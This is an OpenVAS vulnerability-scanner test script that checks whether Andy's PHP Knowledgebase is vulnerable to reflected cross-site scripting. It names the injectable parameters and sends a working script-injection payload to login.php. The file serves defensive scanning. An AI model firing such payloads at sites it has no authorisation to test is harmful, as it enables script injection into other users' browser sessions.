###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aphpkb_mult_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Andy's PHP Knowledgebase Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802225");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-08-02 09:08:31 +0200 (Tue, 02 Aug 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Andy's PHP Knowledgebase Multiple Cross-Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secpod.org/blog/?p=220");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_APHPKB_XSS.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_aphpkb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("aphpkb/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to insert arbitrary
HTML and script code, which will be executed in a user's browser session in the
context of an affected site.");
  script_tag(name:"affected", value:"Andy's PHP Knowledgebase version 0.95.5 and prior.");
  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied
input passed via the 'username' parameter in login.php and forgot_password.php,
'first_name', 'last_name', 'email', 'username' parameters in register.php,
and 'keyword_list' parameter in keysearch.php, that allows attackers to execute
arbitrary HTML and script code on the web server.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Andy's PHP Knowledgebase and is prone to
multiple cross site scripting vulnerabilities.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);

if(!dir = get_dir_from_kb(port:port, app:"aphpkb")){
  exit(0);
}

host = http_host_name( port:port );

postData = string('username="><script>alert("OpenVAS-XSS-Test")</script>',
                  '&password=&submit=Login');

req = string("POST ", dir, "/login.php HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData), "\r\n\r\n", postData);

res = http_keepalive_send_recv(port:port, data:req);

if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
  ('><script>alert("OpenVAS-XSS-Test")</script>' >< res)){
  security_message(port);
}
